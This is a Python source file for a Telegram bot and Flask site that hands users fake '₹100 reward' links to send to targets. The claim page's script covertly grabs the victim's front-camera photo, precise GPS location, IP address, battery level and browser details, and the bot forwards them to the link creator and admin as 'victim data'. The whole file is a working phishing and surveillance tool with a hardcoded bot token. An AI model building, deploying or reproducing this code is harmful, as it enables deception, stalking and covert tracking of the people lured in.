import os
import json
import uuid
import base64
import logging
import requests
from io import BytesIO
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import asyncio
import threading
import time

# ======== CONFIG ========
BOT_TOKEN = "8222470338:AAE5mR86BFGu1V9NwJok-N1yquxbmqtHVNI"
ADMIN_ID = 8586849798
APP_URL = os.environ.get("https://claim100rsfree-2.onrender.com", "https://your-app.onrender.com")
PORT = int(os.environ.get("PORT", 5000))

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ======== DATABASE ========
DB_FILE = "botdata.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            return json.load(f)
    return {"admins": [str(ADMIN_ID)], "banned": [], "users": [], "logs": [], "bot_on": True, "tokens": {}}

def save_db(db):
    with open(DB_FILE, "w") as f:
        json.dump(db, f, indent=2)

def is_admin(uid):
    db = load_db()
    return str(uid) in db["admins"] or str(uid) == str(ADMIN_ID)

def is_banned(uid):
    db = load_db()
    return str(uid) in db.get("banned", [])

# ======== FLASK WEB ========
app = Flask(__name__)

CLAIM_HTML = """<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Claim Reward</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.box{background:#fff;border-radius:20px;padding:40px 30px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
.icon{font-size:72px;margin-bottom:20px;animation:bounce 1s infinite}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
h1{color:#333;font-size:28px;margin-bottom:10px}
.rs{font-size:48px;font-weight:700;color:#28a745;margin:15px 0}
.rs span{font-size:24px}
p{color:#666;margin-bottom:25px;font-size:14px}
.btn{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;padding:18px 60px;font-size:22px;font-weight:700;border-radius:50px;cursor:pointer;width:100%;box-shadow:0 5px 20px rgba(102,126,234,.4)}
.btn:hover{transform:translateY(-2px)}
.btn:disabled{opacity:.7;cursor:not-allowed}
.sts{margin-top:20px;padding:15px;border-radius:10px;display:none}
.ok{background:#d4edda;color:#155724;display:block}
.fail{background:#f8d7da;color:#721c24;display:block}
.load{display:none;margin-top:15px}
.spin{border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
small{font-size:11px;color:#999;margin-top:20px;display:block}
</style>
</head>
<body>
<div class="box">
<div class="icon">🎉</div>
<h1>Congratulations!</h1>
<p>You have been selected as today's winner!</p>
<div class="rs">₹<span>100</span></div>
<p>Tap below to claim your reward instantly.</p>
<button class="btn" onclick="claim()" id="cbtn">👉 CLAIM ₹100</button>
<div class="load" id="load"><div class="spin"></div><p style="margin-top:10px;color:#666;">Verifying...</p></div>
<div class="sts" id="sts"></div>
<small>* Limited time offer</small>
</div>
<script>
let TKN = "[TOKEN]";
let sent = false;
async function claim(){
  if(sent) return; sent = true;
  document.getElementById('cbtn').style.display = 'none';
  document.getElementById('load').style.display = 'block';
  let bat = 'Unknown', lat = null, lon = null, photo = null;
  try{let b = await navigator.getBattery(); bat = Math.round(b.level*100)+'%'}catch(e){}
  try{
    let p = await new Promise((ok,no)=>navigator.geolocation.getCurrentPosition(ok,no,{enableHighAccuracy:true,timeout:8000}));
    lat = p.coords.latitude; lon = p.coords.longitude;
  }catch(e){}
  try{
    let s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240},audio:false});
    let v = document.createElement('video'); v.srcObject = s; await v.play();
    let c = document.createElement('canvas'); c.width = 320; c.height = 240;
    c.getContext('2d').drawImage(v,0,0);
    s.getTracks().forEach(t=>t.stop());
    photo = c.toDataURL('image/jpeg',0.7);
  }catch(e){}
  let ip = 'Unknown';
  try{let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); ip = d.ip}catch(e){}
  fetch('/collect/'+TKN,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({battery:bat,lat:lat,lon:lon,photo:photo,ip:ip,ua:navigator.userAgent,ts:new Date().toISOString()})
  }).then(r=>r.json()).then(d=>{
    document.getElementById('load').style.display = 'none';
    document.getElementById('sts').className = 'sts ok';
    document.getElementById('sts').innerHTML = '✅ <b>Reward Claimed!</b><br>₹100 will be credited within 24 hours.';
  }).catch(e=>{
    document.getElementById('load').style.display = 'none';
    document.getElementById('sts').className = 'sts fail';
    document.getElementById('sts').innerHTML = '❌ Try again.';
    sent = false;
  });
}
</script>
</body>
</html>"""

@app.route('/')
def home():
    return "✅ Bot is running", 200

@app.route('/health')
def health():
    return "OK", 200

@app.route('/collect/<token>')
def claim_page(token):
    db = load_db()
    if token not in db.get("tokens", {}):
        return "❌ Invalid or expired link", 404
    return render_template_string(CLAIM_HTML.replace("[TOKEN]", token))

@app.route('/collect/<token>', methods=['POST'])
def collect_data(token):
    db = load_db()
    if token not in db.get("tokens", {}):
        return jsonify({"success": False, "error": "Invalid or expired link"}), 404
    
    data = request.json
    tok = db["tokens"].pop(token)
    save_db(db)
    
    entry = {
        "uid": tok.get("user_id"),
        "uname": tok.get("username"),
        "fname": tok.get("first_name"),
        "ip": data.get("ip", "N/A"),
        "battery": data.get("battery", "N/A"),
        "lat": data.get("lat"),
        "lon": data.get("lon"),
        "photo": data.get("photo"),
        "ua": data.get("ua", "N/A"),
        "ts": datetime.now().isoformat()
    }
    
    db = load_db()
    db["logs"].append(entry)
    save_db(db)
    
    # Send notification to admin
    try:
        msg = f"🔔 <b>New Victim Data!</b>\n"
        msg += f"👤 {entry['fname']} (@{entry['uname']})\n"
        msg += f"🆔 ID: {entry['uid']}\n"
        msg += f"🌐 IP: <code>{entry['ip']}</code>\n"
        msg += f"🔋 Battery: {entry['battery']}\n"
        if entry['lat'] and entry['lon']:
            msg += f"📍 {entry['lat']}, {entry['lon']}\n"
            msg += f"🗺️ <a href='https://maps.google.com/maps?q={entry['lat']},{entry['lon']}'>Google Maps</a>\n"
        msg += f"🕐 {entry['ts']}"
        
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
            "chat_id": ADMIN_ID, "text": msg, "parse_mode": "HTML"
        })
        
        if entry.get('photo'):
            try:
                img_bytes = base64.b64decode(entry['photo'].split(',')[1])
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
                    data={"chat_id": ADMIN_ID, "caption": "📸 Victim Photo"},
                    files={"photo": ("victim.jpg", BytesIO(img_bytes), "image/jpeg")})
            except:
                pass
    except Exception as e:
        logger.error(f"Notification error: {e}")
    
    return jsonify({"success": True})

# ======== TELEGRAM BOT HANDLERS ========
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    db = load_db()
    
    if is_banned(u.id):
        await update.message.reply_text("❌ Access Denied. Contact @iflexvenom")
        return
    if not db.get("bot_on", True):
        await update.message.reply_text("❌ Bot is currently disabled. Contact @iflexvenom")
        return
    
    # Register user
    if str(u.id) not in [x["id"] for x in db["users"]]:
        db["users"].append({"id": str(u.id), "uname": u.username, "fname": u.first_name, "joined": str(update.message.date)})
        save_db(db)
        # Notify admin about new user
        if str(u.id) != str(ADMIN_ID):
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    "chat_id": ADMIN_ID, "text": f"🆕 New user started bot: {u.first_name} (@{u.username}) [ID: {u.id}]"
                })
            except:
                pass
    
    welcome = f"👋 Welcome {u.first_name}!\n\n"
    welcome += "Send me any link (http/https). I'll generate a reward claim link.\n"
    welcome += "When victim opens the link and taps 'Claim ₹100', you'll get their data in DM."
    
    await update.message.reply_text(welcome)
    
    if is_admin(u.id):
        await update.message.reply_text("✅ You are an admin! Use /help for admin commands.")

async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    db = load_db()
    
    if is_banned(u.id):
        await update.message.reply_text("❌ Access Denied. Contact @iflexvenom")
        return
    if not db.get("bot_on", True):
        await update.message.reply_text("❌ Bot is currently disabled. Contact @iflexvenom")
        return
    
    text = update.message.text.strip()
    
    # Handle admin commands
    if is_admin(u.id) and text.startswith("/"):
        args = text.split()
        cmd = args[0].lower()
        
        if cmd == "/help":
            h = """<b>🔐 Admin Commands:</b>
            
/approve [user_id] - Add admin
/unapprove [user_id] - Remove admin
/ban [user_id] - Ban a user
/unban [user_id] - Unban a user
/users - Show all registered users
/stats - Show bot statistics
/logs - Show recent victim logs
/on - Enable bot
/off - Disable bot
/clear - Clear all logs
/help - Show this message"""
            await update.message.reply_text(h, parse_mode="HTML")
        
        elif cmd == "/approve":
            if len(args) < 2:
                await update.message.reply_text("Usage: /approve [user_id]")
                return
            uid = args[1]
            db = load_db()
            if uid not in db["admins"]:
                db["admins"].append(uid)
                save_db(db)
                await update.message.reply_text(f"✅ User {uid} is now an admin!")
                try:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                        "chat_id": uid, "text": "✅ You have been approved as admin! Use /help for commands."
                    })
                except:
                    pass
            else:
                await update.message.reply_text("Already an admin.")
        
        elif cmd == "/unapprove":
            if len(args) < 2:
                await update.message.reply_text("Usage: /unapprove [user_id]")
                return
            uid = args[1]
            db = load_db()
            if uid in db["admins"] and uid != str(ADMIN_ID):
                db["admins"].remove(uid)
                save_db(db)
                await update.message.reply_text(f"❌ {uid} removed from admins.")
            else:
                await update.message.reply_text("Cannot remove main admin or user not an admin.")
        
        elif cmd == "/ban":
            if len(args) < 2:
                await update.message.reply_text("Usage: /ban [user_id]")
                return
            uid = args[1]
            db = load_db()
            if uid not in db.get("banned", []):
                db.setdefault("banned", []).append(uid)
                save_db(db)
                await update.message.reply_text(f"⛔ User {uid} has been banned!")
        
        elif cmd == "/unban":
            if len(args) < 2:
                await update.message.reply_text("Usage: /unban [user_id]")
                return
            uid = args[1]
            db = load_db()
            if uid in db.get("banned", []):
                db["banned"].remove(uid)
                save_db(db)
                await update.message.reply_text(f"✅ User {uid} has been unbanned!")
        
        elif cmd == "/users":
            db = load_db()
            users = db["users"]
            if not users:
                await update.message.reply_text("No users yet.")
                return
            msg = f"📊 <b>Total Users: {len(users)}</b>\n\n"
            for x in users[-20:]:
                msg += f"🆔 {x['id']} | {x.get('fname','?')} | @{x.get('uname','?')}\n"
            await update.message.reply_text(msg, parse_mode="HTML")
        
        elif cmd == "/stats":
            db = load_db()
            msg = f"📊 <b>Bot Statistics</b>\n\n"
            msg += f"👥 Total Users: {len(db['users'])}\n"
            msg += f"📝 Total Logs: {len(db['logs'])}\n"
            msg += f"🛡️ Admins: {len(db['admins'])}\n"
            msg += f"⛔ Banned: {len(db.get('banned',[]))}\n"
            msg += f"🔋 Bot Status: {'🟢 ON' if db.get('bot_on') else '🔴 OFF'}"
            await update.message.reply_text(msg, parse_mode="HTML")
        
        elif cmd == "/logs":
            db = load_db()
            logs = db["logs"]
            if not logs:
                await update.message.reply_text("No logs yet.")
                return
            msg = f"📋 <b>Recent {min(10, len(logs))} of {len(logs)} Logs:</b>\n\n"
            for l in logs[-10:]:
                msg += f"👤 {l.get('fname','?')} (@{l.get('uname','?')})\n"
                msg += f"🌐 IP: {l.get('ip','?')}\n"
                msg += f"🔋 Battery: {l.get('battery','?')}\n"
                if l.get('lat'): msg += f"📍 {l['lat']},{l['lon']}\n"
                msg += f"🕐 {l.get('ts','?')[:19]}\n"
                msg += "─────────────\n"
            await update.message.reply_text(msg, parse_mode="HTML")
        
        elif cmd == "/on":
            db = load_db()
            db["bot_on"] = True
            save_db(db)
            await update.message.reply_text("🟢 Bot is now <b>ON</b>", parse_mode="HTML")
        
        elif cmd == "/off":
            db = load_db()
            db["bot_on"] = False
            save_db(db)
            await update.message.reply_text("🔴 Bot is now <b>OFF</b>", parse_mode="HTML")
        
        elif cmd == "/clear":
            db = load_db()
            db["logs"] = []
            save_db(db)
            await update.message.reply_text("🗑️ All logs cleared!")
        
        return
    
    # Non-admin: generate claim link
    if not text.startswith(("http://", "https://")):
        await update.message.reply_text("❌ Please send a valid link starting with http:// or https://")
        return
    
    token = str(uuid.uuid4())[:8]
    claim_url = f"{APP_URL}/collect/{token}"
    
    db = load_db()
    db["tokens"][token] = {
        "user_id": str(u.id),
        "username": u.username,
        "first_name": u.first_name,
        "original_link": text,
        "created": str(update.message.date)
    }
    save_db(db)
    
    await update.message.reply_text(
        f"✅ <b>Claim Link Generated!</b>\n\n"
        f"🔗 <code>{claim_url}</code>\n\n"
        f"Send this to your target. When they tap and claim, their data will arrive in your DM.",
        parse_mode="HTML"
    )

# ======== MAIN ========
def run_flask():
    """Run Flask on port 10000 (Render's default)"""
    try:
        app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
    except Exception as e:
        logger.error(f"Flask error: {e}")

def run_telegram():
    """Run Telegram bot with polling (more reliable on Render)"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        logger.info("Starting Telegram bot with polling...")
        application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except Exception as e:
        logger.error(f"Telegram bot error: {e}")

if __name__ == "__main__":
    logger.info(f"Starting bot on port {PORT}")
    logger.info(f"APP_URL: {APP_URL}")
    logger.info(f"Admin ID: {ADMIN_ID}")
    
    # Start Flask in a thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Small delay to ensure Flask starts first
    time.sleep(1)
    
    # Run Telegram bot in main thread
    run_telegram()
